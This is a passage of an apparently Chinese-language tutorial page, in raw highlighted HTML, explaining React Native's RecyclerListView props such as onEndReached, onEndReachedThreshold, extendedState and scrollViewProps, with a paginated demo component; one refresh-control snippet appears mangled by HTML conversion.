keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//Given type and data return the view component</span>    <span class="token function">_rowRenderer</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//You can return any view here, CellContainer has no special significance</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> ViewTypes<span class="token punctuation">.</span>HALF_LEFT<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>                    <span class="token operator">&lt;</span>CellContainer style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>containerGridLeft<span class="token punctuation">}</span><span class="token operator">></span>                        <span class="token operator">&lt;</span>Text<span class="token operator">></span>Data<span class="token punctuation">:</span> <span class="token punctuation">{</span>data<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>CellContainer<span class="token operator">></span>                <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> ViewTypes<span class="token punctuation">.</span>HALF_RIGHT<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>                    <span class="token operator">&lt;</span>CellContainer style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>containerGridRight<span class="token punctuation">}</span><span class="token operator">></span>                        <span class="token operator">&lt;</span>Text<span class="token operator">></span>Data<span class="token punctuation">:</span> <span class="token punctuation">{</span>data<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>CellContainer<span class="token operator">></span>                <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> ViewTypes<span class="token punctuation">.</span>FULL<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>                    <span class="token operator">&lt;</span>CellContainer style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>container<span class="token punctuation">}</span><span class="token operator">></span>                        <span class="token operator">&lt;</span>Text<span class="token operator">></span>Data<span class="token punctuation">:</span> <span class="token punctuation">{</span>data<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>CellContainer<span class="token operator">></span>                <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">&lt;</span>RecyclerListView layoutProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_layoutProvider<span class="token punctuation">}</span> dataProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>dataProvider<span class="token punctuation">}</span> rowRenderer<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_rowRenderer<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> styles <span class="token operator">=</span> <span class="token punctuation">{</span>    container<span class="token punctuation">:</span> <span class="token punctuation">{</span>        justifyContent<span class="token punctuation">:</span> <span class="token string">"space-around"</span><span class="token punctuation">,</span>        alignItems<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>        flex<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        backgroundColor<span class="token punctuation">:</span> <span class="token string">"#00a1f1"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    containerGridLeft<span class="token punctuation">:</span> <span class="token punctuation">{</span>        justifyContent<span class="token punctuation">:</span> <span class="token string">"space-around"</span><span class="token punctuation">,</span>        alignItems<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>        flex<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        backgroundColor<span class="token punctuation">:</span> <span class="token string">"#ffbb00"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    containerGridRight<span class="token punctuation">:</span> <span class="token punctuation">{</span>        justifyContent<span class="token punctuation">:</span> <span class="token string">"space-around"</span><span class="token punctuation">,</span>        alignItems<span class="token punctuation">:</span> <span class="token string">"center"</span><span class="token punctuation">,</span>        flex<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        backgroundColor<span class="token punctuation">:</span> <span class="token string">"#7cbb00"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>页面效果：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/list.gif" alt></p><p>但是在实际的业务开发中肯定不会是这么简单的，一般都会用到分页，下拉刷新什么的；下面介绍几个比较常用的属性：</p><h3 id="4、onEndReached"><a href="#4、onEndReached" class="headerlink" title="4、onEndReached"></a>4、onEndReached</h3><p>列表触底是触发，一般是用来做上拉加载更过数据的时候来使用的</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>RecyclerListView    layoutProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_layoutProvider<span class="token punctuation">}</span>    dataProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>dataProvider<span class="token punctuation">.</span><span class="token function">cloneWithRows</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>infoList<span class="token punctuation">)</span><span class="token punctuation">}</span>    rowRenderer<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_rowRenderer<span class="token punctuation">}</span>    onEndReached<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_onLoadMore<span class="token punctuation">}</span><span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、onEndReachedThreshold"><a href="#5、onEndReachedThreshold" class="headerlink" title="5、onEndReachedThreshold"></a>5、onEndReachedThreshold</h3><p>列表距离底部多大距离时触发onEndReached的回调，这个填写的是具体的像素值，与FlatList是有区别的，FlatList填写的是百分比</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>RecyclerListView    layoutProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_layoutProvider<span class="token punctuation">}</span>    dataProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>dataProvider<span class="token punctuation">.</span><span class="token function">cloneWithRows</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>infoList<span class="token punctuation">)</span><span class="token punctuation">}</span>    rowRenderer<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_rowRenderer<span class="token punctuation">}</span>    onEndReached<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_onLoadMore<span class="token punctuation">}</span>    onEndReachedThreshold<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">50</span><span class="token punctuation">}</span><span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6、extendedState"><a href="#6、extendedState" class="headerlink" title="6、extendedState"></a>6、extendedState</h3><p>在更新目前列表渲染以外的数据时，可以使用此属性更新状态，以便绘制出新的列表，并且不再重新渲染以前的列表数据</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>RecyclerListView    layoutProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_layoutProvider<span class="token punctuation">}</span>    dataProvider<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>dataProvider<span class="token punctuation">.</span><span class="token function">cloneWithRows</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>infoList<span class="token punctuation">)</span><span class="token punctuation">}</span>    rowRenderer<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_rowRenderer<span class="token punctuation">}</span>    onEndReached<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>_onLoadMore<span class="token punctuation">}</span>    onEndReachedThreshold<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">50</span><span class="token punctuation">}</span>    extendedState<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">}</span><span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7、scrollViewProps"><a href="#7、scrollViewProps" class="headerlink" title="7、scrollViewProps"></a>7、scrollViewProps</h3><p>继承scrollView的属性，RecyclerListView本身是不具有刷新属性的，要想使用刷新功能，就可以继承scrollView的下拉刷新</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>RecyclerListView    scrollViewProps<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>        refreshControl<span class="token punctuation">:</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>refreshcontrol refreshing<span class="token operator">=</span><span class="token string">"{this.state.loading}"</span> onrefresh<span class="token operator">=</span><span class="token string">"{async"</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> loading<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> loading<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">}</span>            <span class="token operator">/</span><span class="token operator">></span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>refreshcontrol<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面看一下完整的demo</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> View<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Dimensions<span class="token punctuation">,</span> StyleSheet<span class="token punctuation">,</span> RefreshControl<span class="token punctuation">,</span> Alert <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react-native"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> RecyclerListView<span class="token punctuation">,</span> DataProvider<span class="token punctuation">,</span> LayoutProvider <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"recyclerlistview"</span><span class="token punctuation">;</span><span class="token keyword">import</span> WBCST <span class="token keyword">from</span> <span class="token string">"./../../rn-app"</span><span class="token punctuation">;</span><span class="token keyword">const</span> ViewTypes <span class="token operator">=</span> <span class="token punctuation">{</span>    FULL<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">{</span> width <span class="token punctuation">}</span> <span class="token operator">=</span> Dimensions<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"window"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> styles <span class="token operator">=</span> StyleSheet<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    container<span class="token punctuation">:</span> <span class="token punctuation">{</span>        flexDirection<span class="token punctuation">:</span> <span class="token string">"row"</span><span class="token punctuation">,</span>        justifyContent<span class="token punctuation">:</span> <span class="token string">"space-between"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// alignItems: "center",</span>        flex<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        backgroundColor<span class="token punctuation">:</span> <span class="token string">"#fff"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// borderWidth: 1,</span>        borderColor<span class="token punctuation">:</span> <span class="token string">"#dddddd"</span><span class="token punctuation">,</span>        margin<span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span>        marginTop<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        padding<span class="token punctuation">:</span> <span class="token number">15</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    topicLeft<span class="token punctuation">:</span> <span class="token punctuation">{</span>        width<span class="token punctuation">:</span> width <span class="token operator">-</span> <span class="token number">210</span><span class="token punctuation">,</span>        marginRight<span class="token punctuation">:</span> <span class="token number">10</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    topicRight<span class="token punctuation">:</span> <span class="token punctuation">{</span>        backgroundColor<span class="token punctuation">:</span> <span class="token string">"#f5f5f5"</span><span class="token punctuation">,</span>        width<span class="token punctuation">:</span> <span class="token number">140</span><span class="token punctuation">,</span>        height<span class="token punctuation">:</span> <span class="token number">140</span><span class="token punctuation">,</span>        padding<span class="token punctuation">:</span> <span class="token number">15</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    topicTitle<span class="token punctuation">:</span> <span class="token punctuation">{</span>        color<span class="token punctuation">:</span> <span class="token string">"#000"</span><span class="token punctuation">,</span>        fontSize<span class="token punctuation">:</span> <span class="token number">16</span><span class="token punctuation">,</span>        fontWeight<span class="token punctuation">:</span> <span class="token string">"700"</span><span class="token punctuation">,</span>        lineHeight<span class="token punctuation">:</span> <span class="token number">28</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    topicContext<span class="token punctuation">:</span> <span class="token punctuation">{</span>        color<span class="token punctuation">:</span> <span class="token string">"#999"</span><span class="token punctuation">,</span>        fontSize<span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        lineHeight<span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">,</span>        marginTop<span class="token punctuation">:</span> <span class="token number">10</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    topicNum<span class="token punctuation">:</span> <span class="token punctuation">{</span>        fontSize<span class="token punctuation">:</span> <span class="token number">14</span><span class="token punctuation">,</span>        marginTop<span class="token punctuation">:</span> <span class="token number">20</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    topicRightText<span class="token punctuation">:</span> <span class="token punctuation">{</span>        fontSize<span class="token punctuation">:</span> <span class="token number">14</span><span class="token punctuation">,</span>        color<span class="token punctuation">:</span> <span class="token string">"#666"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">RecycleTestComponent</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dataProvider <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataProvider</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r1<span class="token punctuation">,</span> r2<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> r1 <span class="token operator">!==</span> r2<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token punctuation">{</span> width <span class="token punctuation">}</span> <span class="token operator">=</span> Dimensions<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"window"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>_layoutProvider <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LayoutProvider</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> ViewTypes<span class="token punctuation">.</span>FULL<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span>type<span class="token punctuation">,</span> dim<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                dim<span class="token punctuation">.</span>width <span class="token operator">=</span> width<span class="token punctuation">;</span>                dim<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">190</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>            pagenum<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>            infoList<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            loading<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            isLoadMore<span class="token punctuation">:</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    getInfo <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>pagenum<span class="token punctuation">;</span>        <span class="token keyword">let</span> info <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>infoList<span class="token punctuation">;</span>        WBCST<span class="token punctuation">.</span><span class="token function">getFetch</span><span class="token punctuation">(</span><span class="token string">"http://app.58.com/api/community/aggregatepage/tabs/topic"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            pagesize<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>            pagenum<span class="token punctuation">:</span> num        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">let</span> loadMore <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>questions<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        loadMore <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                        isLoadMore<span class="token punctuation">:</span> loadMore<span class="token punctuation">,</span>                        infoList<span class="token punctuation">:</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>questions                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// info.concat(res.data.questions);</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>questions<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        loadMore <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        loadMore <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                        isLoadMore<span class="token punctuation">:</span> loadMore<span class="token punctuation">,</span>                        infoList<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>infoList<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>questions<span class="token punctuation">)</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    _rowRenderer <span class="token operator">=</span> <span class="token punctuation">(</span>type<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>container<span class="token punctuation">}</span><span class="token operator">></span>                <span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>topicLeft<span class="token punctuation">}</span><span class="token operator">></span>                    <span class="token operator">&lt;</span>Text numberOfLines<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span> style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>topicTitle<span class="token punctuation">}</span><span class="token operator">></span>                        <span class="token punctuation">{</span>data<span class="token punctuation">.</span>topic<span class="token punctuation">.</span>title<span class="token punctuation">}</span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                    <span class="token operator">&lt;</span>Text numberOfLines<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span> style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>topicContext<span class="token punctuation">}</span><span class="token operator">></span>                        <span class="token punctuation">{</span>data<span class="token punctuation">.</span>topic<span class="token punctuation">.</span>context<span class="token punctuation">}</span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                    <span class="token operator">&lt;</span>Text style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>topicNum<span class="token punctuation">}</span><span class="token operator">></span>                        <span class="token punctuation">{</span>data<span class="token punctuation">.</span>topic<span class="token punctuation">.</span>pn<span class="token punctuation">}</span>                        人参与此话题                    <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span>                <span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>topicRight<span class="token punctuation">}</span><span class="token operator">></span>                    <span class="token operator">&lt;</span>Text style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>topicRightText<span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">{</span>data<span class="token punctuation">.</span>user<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                    <span class="token operator">&lt;</span>Text style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">{</span> marginTop<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> styles<span class="token punctuation">.</span>topicRightText<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">{</span>data<span class="token punctuation">.</span>title<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    _renderFooter <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>View<span class="token operator">></span>                <span class="token operator">&lt;</span>Text<span class="token operator">></span>上拉加载更多<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    _onLoadMore <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Alert.alert(JSON.stringify("num"));</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>isLoadMore<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>pagenum<span class="token punctuation">;</span>        num <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>            <span class="token punctuation">{</span>                pagenum<span class="token punctuation">:</span> num            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Alert.alert(JSON.stringify(num));</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    componentDidMount <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token 